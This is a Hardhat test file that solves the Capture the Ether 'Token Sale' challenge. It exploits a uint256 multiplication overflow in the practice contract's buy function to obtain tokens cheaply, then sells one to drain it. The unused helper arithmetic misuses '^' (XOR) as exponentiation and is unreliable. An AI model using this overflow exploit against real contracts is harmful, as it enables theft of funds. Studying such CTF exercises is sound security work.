import { time, loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { anyValue } from '@nomicfoundation/hardhat-chai-matchers/withArgs';
import { expect } from 'chai';
import { ethers, network } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { Contract } from 'ethers';

describe('Start Point', async function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();
    const tokenSaleChallengeFactory = await ethers.getContractFactory(
      'TokenSaleChallenge'
    );

    const tokenSaleChallengeContract = await tokenSaleChallengeFactory.deploy(
      owner.address,
      {
        value: ethers.utils.parseEther('1'),
      }
    );

    return {
      tokenSaleChallengeContract,
      owner,
      attackerWallet,
    };
  }

  describe('exploit', async function () {
    let tokenSaleChallengeContract: Contract,
      owner: SignerWithAddress,
      attackerWallet: SignerWithAddress;

    before(async function () {
      ({ tokenSaleChallengeContract, owner, attackerWallet } =
        await loadFixture(setup));
    });

    it('Should Attack buy function', async function () {
      const numTokens = ((2 ^ 256) - 1) / (10 ^ 18) + 1; // '115792089237316195423570985008687907853269984665640564039458'
      const msgValue = numTokens * (10 ^ 18) - (2 ^ 256); // '415992086870360064

      // console.log({ numTokens, msgValue });

      await tokenSaleChallengeContract.buy(
        '115792089237316195423570985008687907853269984665640564039458',
        {
          value: '415992086870360064',
        }
      );

      await tokenSaleChallengeContract.sell(1);

      expect(await tokenSaleChallengeContract.isComplete()).to.equal(true);
    });
  });
});

// https://infosecwriteups.com/%EF%B8%8Fcapture-the-ether-%EF%B8%8F-token-sale-difficulty-low-medium-adc2928bbcc9
// Static number
